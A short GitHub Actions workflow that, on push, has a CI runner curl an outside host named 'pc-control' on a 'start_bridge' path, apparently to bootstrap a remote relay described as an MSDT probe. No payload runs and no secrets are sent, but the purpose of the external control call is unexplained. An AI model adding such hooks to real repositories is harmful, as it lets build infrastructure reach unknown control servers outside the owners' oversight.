name: msdt-bootstrap
on:
  push:
    branches: [main]
    paths:
      - .github/workflows/msdt-bootstrap.yml

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe MSDT through fixed relay bootstrap
        shell: bash
        run: |
          set -euo pipefail
          curl --fail-with-body --silent --show-error --max-time 45 \
            "https://pc-control.20100823.xyz/__h2609_start_bridge_20260929_b73e"
          echo
